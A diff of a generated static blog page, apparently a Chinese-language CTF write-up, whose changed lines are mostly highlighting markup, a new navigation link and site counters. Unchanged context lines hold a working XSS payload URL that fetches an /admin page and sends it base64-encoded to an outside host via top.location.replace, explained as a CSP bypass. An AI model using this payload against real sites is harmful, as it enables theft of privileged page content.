@@ -455,7 +455,7 @@
 
 <h6 id="如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object-freeze可以防止数据的外带。但是我们可以用top-location-replace-39-39-将location移动到外部以发送数据。"><a href="#如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object-freeze可以防止数据的外带。但是我们可以用top-location-replace-39-39-将location移动到外部以发送数据。" class="headerlink" title="如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object.freeze可以防止数据的外带。但是我们可以用top.location.replace(&#39;...&#39;)将location移动到外部以发送数据。"></a>如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是<code>csp</code>和<code>Object.freeze</code>可以防止数据的外带。但是我们可以用<code>top.location.replace(&#39;...&#39;)</code>将<code>location</code>移动到外部以发送数据。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://178.128.175.6:20900/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&apos;/admin&apos;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&apos;//rwx.kr/?&apos;%2bbtoa(x)))</span><br></pre></td></tr></table></figure>
 
-<h6 id="上面的地址获取-admin页面，并将其发送到攻击者的服务器。"><a href="#上面的地址获取-admin页面，并将其发送到攻击者的服务器。" class="headerlink" title="上面的地址获取/admin页面，并将其发送到攻击者的服务器。"></a>上面的地址获取<code>/admin</code>页面，并将其发送到攻击者的服务器。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a href="#/page/sugestii"&gt;Sugestii&lt;/a&gt; --&gt;</span><br></pre></td></tr></table></figure>
+<h6 id="上面的地址获取-admin页面，并将其发送到攻击者的服务器。"><a href="#上面的地址获取-admin页面，并将其发送到攻击者的服务器。" class="headerlink" title="上面的地址获取/admin页面，并将其发送到攻击者的服务器。"></a>上面的地址获取<code>/admin</code>页面，并将其发送到攻击者的服务器。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/page/sugestii"</span>&gt;</span>Sugestii<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span> --&gt;</span><br></pre></td></tr></table></figure>
 
 <h6 id="以上注释位于页面中间。"><a href="#以上注释位于页面中间。" class="headerlink" title="以上注释位于页面中间。"></a>以上注释位于页面中间。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"path"</span> <span class="attr">name</span>=<span class="string">"path"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"/#/page/acasa"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"csrf_token"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"Ijc2NTM2MGNiOTBkZTI4Y2E4ZGExMGRkMTk0NTAwNjE3MGNkNjZmYjAi.XjdpKQ.sFQg9QIAZLFkqSWYsMgfljOT5UA"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">placeholder</span>=<span class="string">"Scrie parerea ta"</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js'</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"g-recaptcha"</span> <span class="attr">data-sitekey</span>=<span class="string">"6LfE7dQUAAAAABOc1rpiWCU0CQF9Msv2XBdvgd5q"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Trimite sugestie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -494,6 +494,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/09/读书日记十一/" rel="prev" title="读书日记十一">
+                读书日记十一 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -572,7 +576,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -686,7 +690,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">150.1k</span>
+    <span title="Site words total count">152.6k</span>
   
 </div>
 
